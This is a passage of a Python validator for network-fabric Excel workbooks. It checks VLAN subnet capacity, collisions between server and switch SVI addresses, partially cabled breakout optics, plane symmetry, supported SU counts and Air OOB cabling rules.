                    f"advertised to cust-net-edge by a rule that never names "
                    f"it. Move it outside {supernet}.")
        elif vrf in _SEPARATELY_ROUTED_VRFS:
            continue
        elif vrf not in _ADVERTISED_VRFS:
            result.warn(
                "VLANs & Profiles",
                f"VLAN {vlan.get('id') or vlan.get('name')}: VRF {vrf!r} is "
                f"classified neither advertised {sorted(_ADVERTISED_VRFS)} nor "
                f"isolated {sorted(_ISOLATED_VRFS)}. Its subnet {subnet} will "
                f"NOT be advertised to cust-net-edge unless it happens to fall "
                f"inside {supernet}. If it should be reachable externally, the "
                f"prefix-list derivation needs to know about this VRF.")


def validate_dataplane_subnet_capacity(parsed_nodes, parsed_vlans, result):
    """ERA-42: hard-fail when a data-plane VLAN subnet can't hold the servers
    assigned to it. Reuses the parser's `_dataplane_host_ips` allocator so this
    check never diverges from the actual assignment. Covers the L2 bond subnets:
    compute -> CPU/In-Band VLAN (1 addr/node), storage/support -> their VLAN
    (2 addrs/node). GPU subnets (variable NIC count, often /20) are not checked
    here.
    """
    def _subnet_for(*keys):
        for v in parsed_vlans:
            nm = str(v.get('name') or '').lower()
            if any(k in nm for k in keys):
                return v.get('subnet')
        return None

    counts = Counter()
    for n in parsed_nodes:
        if n.get('enabled') is False or n.get('is_air_documentary'):
            continue
        counts[classify_host_role(n.get('function') or n.get('name') or '')] += 1

    # (role bucket, subnet, addrs/node, legacy /24 start, stride, label)
    checks = [
        (('compute',), _subnet_for('cpu', 'in-band', 'inband'), 1, 201, 1, 'CPU/In-Band'),
        (('storage',), _subnet_for('storage'), 2, 101, 2, 'Storage'),
        (('support', 'k8s', 'bcme'), _subnet_for('support'), 2, 101, 2, 'Support'),
    ]
    for roles, subnet, per_node, start, stride, label in checks:
        n = sum(counts.get(r, 0) for r in roles)
        if not subnet or n == 0:
            continue
        try:
            # Parsed purely to skip malformed subnets; the shape of the subnet
            # no longer changes what this check does, now that /24 has no
            # special case.
            ipaddress.ip_network(subnet, strict=False)
        except ValueError:
            continue  # malformed subnet already reported elsewhere
        # the LAST node must fit the subnet
        # `total=n` so this models what the parser will ACTUALLY allocate,
        # including the repack-from-the-bottom path. Without it the validator
        # evaluates the legacy `.201` layout and reports a shortfall the
        # generator no longer has — crying wolf, which is how a guard gets
        # ignored.
        if _dataplane_host_ips(subnet, n - 1, per_node, start, stride,
                               total=n) is None:
            # How many actually fit, so the operator sees the shortfall rather
            # than just "too small".
            fits = 0
            while (fits < n
                   and _dataplane_host_ips(subnet, fits, per_node, start,
                                           stride, total=n) is not None):
                fits += 1
            # No /24 special case. This check used to `continue` on /24
            # entirely, which hid the real defect: the allocator's legacy
            # `.201` base left only 54 usable slots in a /24, so four shipped
            # largescale workbooks addressed barely half their compute nodes
            # (2-8-9-800 and 2-8-9-400-SP 54 of 128, 2-4-5-800 54 of 144,
            # 2-8-9-400 54 of 64) while `validate_excel` printed "No errors
            # found". The identical 54 across four different architectures was
            # the tell — one constant, not four undersized subnets.
            #
            # The subnets were never too small: only .0 and .1 were in use
            # below .201, leaving 197 free addresses. `_dataplane_host_ips`
            # now repacks from the bottom when the legacy base will not seat
            # everyone, so a /24 that still does not fit is genuinely too
            # small and earns the same hard error as any other prefix.
            result.error(
                "VLANs & Profiles",
                f"{label} VLAN subnet {subnet} holds only {fits} of {n} "
                f"server(s) at {per_node} address(es) each — the remaining "
                f"{n - fits} get NO {label.lower()} address. Widen the subnet "
                f"or reduce the host count.")


def fabric_claimed_ips(subnet, gateway, svi_switch_count):
    """The addresses the FABRIC takes at the bottom of a data VLAN.

    ``network + 1`` (or the declared gateway) is the VRR/anycast address, and
    each SVI-bearing switch then takes one more from the host range with the
    gateway excluded — exactly what ``_svi_switch_ip`` emits into the configs.
    Returns ``{address: owner}``.
    """
    claimed = {}
    try:
        gw = _svi_gateway_ip(subnet, gateway)
    except Exception:  # pragma: no cover - malformed subnet reported elsewhere
        return claimed
    claimed[gw] = "VRR / anycast gateway"
    for core_num in range(1, max(int(svi_switch_count or 0), 0) + 1):
        addr = _svi_switch_ip(subnet, gateway, core_num)
        claimed.setdefault(addr, f"switch SVI (core-{core_num:02d})")
    return claimed


def find_dataplane_svi_collisions(host_ips, fabric_ips):
    """``[(address, host_label, fabric_owner)]`` for server IPs the fabric owns.

    ``host_ips`` is ``[(label, 'a.b.c.d/NN' or 'a.b.c.d')]``; ``fabric_ips`` is
    the ``{address: owner}`` map from :func:`fabric_claimed_ips`.
    """
    hits = []
    for label, ip_str in host_ips:
        addr = str(ip_str).split('/')[0]
        owner = fabric_ips.get(addr)
        if owner:
            hits.append((addr, label, owner))
    return hits


def validate_dataplane_svi_collisions(parsed_nodes, parsed_vlans, result):
    """ERA-93: a server data-plane IP must never equal a fabric address.

    ADR-0058 fixed the ALLOCATOR — hosts now pack from ``network + 2 + one per
    SVI-bearing switch`` instead of reserving the gateway alone. Nothing
    CHECKED it, which is why ERA-92 cost a day: on a Support VLAN
    ``10.78.220.32/27`` the cores' SVIs were ``.34``/``.35`` and ``k8s-01`` was
    allocated exactly those, the gateway ``.33`` never ARPed, and the entire
    support data plane was dead while every validator reported green.

    With the allocator fixed this gate should never fire. That is the point: it
    exists so the next regression in the reservation arithmetic is caught here
    rather than in an Air sim.
    """
    def _subnet_and_gw(*keys):
        for v in parsed_vlans:
            nm = str(v.get('name') or '').lower()
            if any(k in nm for k in keys):
                return v.get('subnet'), v.get('gateway')
        return None, None

    svi_switches = sum(
        1 for n in parsed_nodes
        if n.get('enabled') is not False and not n.get('is_air_documentary')
        and canonical_category(n.get('function'), n.get('name')) in ('core', 'csl', 'cl')
    )
    # Mirror the parser: with no SVI-bearing switch found, assume the standard
    # pair rather than reserving nothing (see _svi_reserved_offsets).
    reserved = 2 + (svi_switches if svi_switches else 2)

    counts = Counter()
    for n in parsed_nodes:
        if n.get('enabled') is False or n.get('is_air_documentary'):
            continue
        counts[classify_host_role(n.get('function') or n.get('name') or '')] += 1

    checks = [
        (('compute',), _subnet_and_gw('cpu', 'in-band', 'inband'), 1, 201, 1, 'CPU/In-Band'),
        (('storage',), _subnet_and_gw('storage'), 2, 101, 2, 'Storage'),
        (('support', 'k8s', 'bcme'), _subnet_and_gw('support'), 2, 101, 2, 'Support'),
    ]
    for roles, (subnet, gateway), per_node, start, stride, label in checks:
        n = sum(counts.get(r, 0) for r in roles)
        if not subnet or n == 0:
            continue
        host_ips = []
        for idx in range(n):
            # `total=n` matters MOST here: repacking moves hosts down out of
            # the .201+ range and toward the bottom of the subnet, which is
            # exactly where the gateway and the per-switch SVIs live. Modelling
            # the legacy layout would check collisions against addresses no
            # node is actually given.
            ips = _dataplane_host_ips(subnet, idx, per_node, start, stride,
                                      reserved=reserved, total=n)
            if ips is None:
                break  # capacity is validate_dataplane_subnet_capacity's job
            host_ips += [(f"{label} server #{idx + 1}", ip) for ip in ips]

        fabric = fabric_claimed_ips(subnet, gateway, svi_switches or 2)
        for addr, host_label, owner in find_dataplane_svi_collisions(host_ips, fabric):
            result.error(
                "VLANs & Profiles",
                f"{label} VLAN {subnet}: {host_label} is allocated {addr}, "
                f"which the fabric already claims as the {owner}. A server and "
                f"a switch on the same address kill the segment — the gateway "
                f"stops resolving and the whole data plane goes dark, while "
                f"every reachability check still reports the link up. Widen the "
                f"VLAN subnet or move the fabric addressing.")


# Switch-to-switch fabric populations. These are the links the ERA guides size
# in whole ports, and the only ones where a partially-cabled cage is a defect
# rather than a design choice (an uplink profile is legitimately broken out and
# partly cabled, leaving spare capacity).
FABRIC_LINK_PROFILES = ('ISL', 'N/S Leaf Peer')


def validate_fabric_optic_integrity(wb, result):
    """Switch-to-switch links must be cabled in whole optics.

    Model-FREE on purpose. `validate_isl_matches_arch_model` returns early when
    `data-models/` is absent, so in the public distribution — where OEM
    submissions are validated — nothing checks the fabric links at all. This
    compares the workbook against itself and therefore runs everywhere.

    It also answers a narrower question than the model check, which is why it
    does not need a spec decision to be useful: whatever the RA figure turns out
    to be, a cage holding half a transceiver is wrong.

    Warning, not error, deliberately. `2-4-3-200` violates it today (its N/S
    peer is 7 cables across 4 holes), and failing `make import` for a shipped
    arch would block the release rather than inform it. Once that workbook is
    corrected this can be promoted.
    """
    if 'Wire Map' not in wb.sheetnames or 'VLANs & Profiles' not in wb.sheetnames:
        return

    breakouts = {}
    ws = wb['VLANs & Profiles']
    hdr = None
    for r in range(1, min(ws.max_row, 60) + 1):
        if str(ws.cell(r, 1).value or '').strip() == 'Profile':
            hdr = r
            break
    if hdr is None:
        return
    header = [str(ws.cell(hdr, c).value or '').strip() for c in range(1, ws.max_column + 1)]
    try:
        b_col = header.index('Breakout') + 1
    except ValueError:
        return
    for r in range(hdr + 1, ws.max_row + 1):
        name = ws.cell(r, 1).value
        if not name:
            break
        raw = str(ws.cell(r, b_col).value or '').strip()
        try:
            breakouts[str(name).strip()] = int(float(raw)) if raw else 1
        except ValueError:
            breakouts[str(name).strip()] = 1

    wm = wb['Wire Map']
    wm_header = [str(c.value or '').strip() for c in wm[1]]
    try:
        cols = {n: wm_header.index(n) for n in
                ('System Name (A)', 'Port (A)', 'System Name (B)',
                 'Port (B)', 'Network Profile')}
    except ValueError:
        return

    by_profile = {}
    for row in wm.iter_rows(min_row=2, values_only=True):
        if not row:
            continue
        profile = str(row[cols['Network Profile']] or '').strip()
        if profile not in FABRIC_LINK_PROFILES:
            continue
        for name_col, port_col in (('System Name (A)', 'Port (A)'),
                                   ('System Name (B)', 'Port (B)')):
            switch = str(row[cols[name_col]] or '').strip()
            port = str(row[cols[port_col]] or '').strip()
            if switch and port:
                by_profile.setdefault(profile, []).append((switch, port))

    for profile, cables in sorted(by_profile.items()):
        for switch, parent, got, want in find_partial_optics(
                cables, breakouts.get(profile, 1)):
            result.warn(
                "Wire Map",
                f"{switch} {parent} carries {got} of {want} cables on the "
                f"'{profile}' link. A {want}x breakout cage holds one "
                f"transceiver — {want - got} of its lanes are unwired, so the "
                f"optic and the faceplate port are half spent. Cable the "
                f"remaining sub-port(s) or move the link onto a full cage.")

    for switch, parent, profiles in find_shared_fabric_optics(by_profile):
        result.warn(
            "Wire Map",
            f"{switch} {parent} splits one transceiver across {' and '.join(profiles)}. "
            f"Each of those populations is sized separately in the ERA guides, so "
            f"a shared cage is counted against two budgets at once and neither "
            f"can be checked against the faceplate. Give each population its own "
            f"cage(s).")


def find_partial_optics(cables, breakout):
    """Holes carrying fewer than `breakout` cables.

    `cables` is an iterable of ``(switch, port)`` where port is ``swpN`` or
    ``swpNsX``. Returns ``[(switch, parent, got, want), ...]`` sorted.

    A cage fitted with a breakout transceiver carries exactly `breakout`
    cables; fewer means half a transceiver, which is not a thing you can buy.
    Ports with no sub-port suffix are not broken out and are never partial.
    """
    if not breakout or breakout < 2:
        return []
    seen = {}
    unbroken = set()
    for switch, port in cables:
        m = re.match(r'(swp\d+)(?:s(\d+))?$', str(port or '').strip())
        if not m:
            continue
        key = (switch, m.group(1))
        if m.group(2) is None:
            unbroken.add(key)
            continue
        seen.setdefault(key, set()).add(m.group(2))
    return sorted((sw, parent, len(subs), breakout)
                  for (sw, parent), subs in seen.items()
                  if (sw, parent) not in unbroken and len(subs) != breakout)


def find_shared_fabric_optics(cables_by_profile):
    """Holes whose cables are split across two fabric populations.

    `cables_by_profile` maps profile name -> iterable of ``(switch, port)``.
    Returns ``[(switch, parent, [profiles]), ...]`` sorted.

    One transceiver serving two populations is counted against two different
    RA budget lines, so neither line's arithmetic can be checked against the
    faceplate. Observed on `2-4-3-200`, where `core-01 swp30` puts `s0` in the
    N/S peer link and `s1` in the ISL.
    """
    owners = {}
    for profile, cables in (cables_by_profile or {}).items():
        for switch, port in cables:
            m = re.match(r'(swp\d+)(?:s\d+)?$', str(port or '').strip())
            if m:
                owners.setdefault((switch, m.group(1)), set()).add(profile)
    return sorted((sw, parent, sorted(profs))
                  for (sw, parent), profs in owners.items() if len(profs) > 1)


def validate_plane_symmetry(parsed_nodes, result):
    """ERA-45: warn on asymmetric per-role switch counts across GPU planes.

    Dual-plane fabrics normally have the same number of switches per role on
    plane1 and plane2 (e.g. 8 gs-plane1 spines <-> 8 gs-plane2). An asymmetry
    usually means a mislabeled or missing switch (an 8SU submission had a
    gs-plane spine given a gl-plane Function). A warning, not an error — the
    tool trusts the Function, and some designs may legitimately differ. Only
    compares when both planes of a role family are present (single-plane
    archs never warn).
    """
    counts = Counter()
    for n in parsed_nodes:
        if n.get('enabled') is False or n.get('is_air_documentary'):
            continue
        role = canonical_category(n.get('function'), n.get('name'))
        if role and (role.endswith('-plane1') or role.endswith('-plane2')):
            counts[role] += 1
    for base in ('gl', 'gs', 'gsl'):
        p1 = counts.get(f'{base}-plane1', 0)
        p2 = counts.get(f'{base}-plane2', 0)
        if p1 and p2 and p1 != p2:
            result.warn(
                "Nodes",
                f"Plane asymmetry: {p1} {base}-plane1 switch(es) but {p2} "
                f"{base}-plane2. Dual-plane fabrics are normally symmetric — "
                f"check for a mislabeled Function or a missing switch.")


def validate_single_tier_su(settings, parsed_nodes, result):
    """Flag deployments outside the generator-supported architecture model.

    The legacy scale-sample path still uses ``arch_scaling.py``. For the
    source-derived XLSX generator, the authoritative support matrix is
    ``scripts/models/<arch>.yaml`` because it can include source rows that
    are documented but intentionally skipped until templates exist.
    """
    try:
        from arch_scaling import get_tier, node_name_to_su
    except ImportError:
        return  # tooling not available in this environment
    if not settings:
        return
    arch = str(settings.get('architecture', '')).strip()
    if not arch:
        return

    supported_sus = None
    model_row = None
    nodes_per_su = 4
    try:
        from models import ModelError, available_sus, get_arch_row, load_arch_model
    except ImportError:
        ModelError = None
    else:
        try:
            model = load_arch_model(arch)
            nodes_per_su = int(model.get('nodes_per_su') or nodes_per_su)
        except ModelError:
            pass
        try:
            supported_sus = available_sus(arch)
        except ModelError:
            supported_sus = None

    # Count distinct active SU indices from Nodes tab. The source-derived
    # models decide how many gpu-NN rows belong to one SU; GB300 B300 uses
    # four, while GB300 NVL72 uses eighteen.
    active_sus = set()
    for n in parsed_nodes:
        if not n.get('enabled', True):
            continue
        su = _node_name_to_su_for_model(n.get('name', ''), nodes_per_su, node_name_to_su)
        if su is not None:
            active_sus.add(su)
    if not active_sus:
        return

    su_count = max(active_sus)  # the highest SU index in active rows
    if supported_sus:
        if su_count not in supported_sus:
            supported = ", ".join(str(su) for su in supported_sus)
            result.error(
                "Nodes",
                f"Active SU count ({su_count}) is not generator-supported "
                f"for {arch}. Supported generator SUs: {supported}. "
                f"Source rows that need missing roles/templates must stay "
                f"documented in the model but skipped by generation.")
            return
        try:
            _, model_row = get_arch_row(arch, su_count)
        except ModelError:
            model_row = None

    if supported_sus is None:
        # Public distribution: the internal generator models aren't present, so
        # fall back to the largest SU count validated/shipped for this arch
        # (single- OR multi-tier — the largescale example workbooks live here).
        from arch_scaling import max_supported_su
        max_su = max_supported_su(arch)
        if max_su is None:
            return  # unknown arch — skip silently
        if su_count > max_su:
            result.error(
                "Nodes",
                f"Active SU count ({su_count}) exceeds the maximum validated "
                f"SU ({max_su}) for {arch}. Reduce the active SU count.")
            return

    # Warn (not error) if OOB switch count doesn't match the source model.
    # Use canonical_category so hostname-classified oob-switches (where
    # Function column is blank but name starts oob-switch-) are counted too.
    oob_in_nodes = sum(
        1 for n in parsed_nodes
        if n.get('enabled', True)
        and canonical_category(str(n.get('function', '')),
                               str(n.get('name', ''))) == 'oob-switch'
    )
    expected_oob = None
    notes = None
    if model_row:
        expected_oob = int(model_row.get("oob", 0) or 0)
        notes = "source-derived architecture model"
    else:
        tier = get_tier(arch, su_count)
        if tier:
            expected_oob = tier.oob_switches
            notes = tier.notes

    if expected_oob and oob_in_nodes and oob_in_nodes != expected_oob:
        result.warn(
            "Nodes",
            f"Active OOB switch count ({oob_in_nodes}) doesn't match "
            f"the expected {expected_oob} for {arch} at SU={su_count} "
            f"({notes}). Add or remove OOB switches to match the "
            f"architecture's fan-out table.")


def validate_air_oob_single_cable(ws, parsed_nodes, result, settings=None):
    """Each active node should have exactly ONE Display=Yes OOB row.

    Air's plain-Ubuntu nodes can't bond two OOB links — they'd either
    drop one silently or loop the bridge. Reflect that by enforcing
    1 Display=Yes OOB row per node.

    AIR-ONLY, and gated on `deploy_in_air`. The column this reads,
    `Display in Air`, feeds nothing but the Air topology — every consumer of
    `display_in_air` lives in `utils.py` / `topology_generator.py`, none in the
    switch configs or the Ansible inventory. On a physical deployment two OOB
    NICs per node are ordinary cabling (a host management port plus a separate
    BMC/LOM), so warning about them is noise aimed at a simulation the operator
    is not building.

    Absent `deploy_in_air` defaults to Yes, matching `excel_parser._…` at
    excel_parser.py:5324, so a workbook predating the key keeps today's
    behaviour and only an explicit `No` silences the check. (Note the sibling
    read at line ~920 defaults the same key to False for the switch-mgmt-IP
    rule; that asymmetry is pre-existing and left alone here.)
    """
    if not parsed_nodes:
        return
    if settings is not None:
        raw = str(settings.get('deploy_in_air', 'Yes')).strip().lower()
        if raw not in ('yes', 'true', '1'):
            return
    # Resolve Wire Map column indices via the header-alias map so we don't
    # silently mis-read if a future Excel reorders columns (every other
    # Wire Map validator in this file uses build_wiremap_column_map).
    try:
        col_map = build_wiremap_column_map(ws, sheet_kind='wiremap')
    except ValueError:
        return
    DISP_COL = col_map.get('display_in_air')
    SYSNAME_COL = col_map.get('system_name')
    SW_COL = col_map.get('switch_name')
    if not all((DISP_COL, SYSNAME_COL, SW_COL)):
        return
    # Build set of active *server* node names. Switch uplinks to the OOB
    # fabric are bonded by Cumulus (not Ubuntu) so the single-cable rule
    # doesn't apply — exclude any node whose function/role is a switch.
    active_names = set()
    for n in parsed_nodes:
        if not n.get('enabled', True):
            continue
        category = canonical_category(
            str(n.get('function', '')), str(n.get('name', '')))
        if category in _SWITCH_CATEGORIES:
            continue
        active_names.add(str(n.get('name', '')).strip())
    # Count Display=Yes OOB rows per node
    per_node_yes = {}
    for r in range(2, ws.max_row + 1):
        disp = ws.cell(r, DISP_COL).value
        sysname = ws.cell(r, SYSNAME_COL).value
        sw = ws.cell(r, SW_COL).value
        if not sw or 'oob-switch' not in str(sw):
            continue
        if str(disp).strip().lower() != 'yes':
            continue
        name_s = str(sysname or '').strip()
        if name_s not in active_names:
            continue
        per_node_yes.setdefault(name_s, []).append(r)
    for node, rows in per_node_yes.items():
        if len(rows) > 1:
            result.warn(
                "Wire Map",
                f"Node '{node}' has {len(rows)} Display=Yes OOB rows "
                f"(rows {rows}). Air's plain Ubuntu can't bond OOB links, so "
                f"leave ONE row Display=Yes — the host's OOB management port — "
                f"and set Display=No on the rest, including any BMC/LOM/iLO "
                f"row. This affects the Air topology only; the cabling itself "
                f"is unchanged. Set deploy_in_air=No if you are not building "
                f"a simulation.")


def main():
    parser = argparse.ArgumentParser(
        description="Validate an ERA Excel configuration file.",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog=__doc__,
    )
    parser.add_argument('excel', metavar='EXCEL', help="Path to the Excel file to validate")
    args = parser.parse_args()

    result = validate_excel(args.excel)
    print(result.summary())

    return 0 if result.ok else 1


if __name__ == '__main__':
    sys.exit(main())
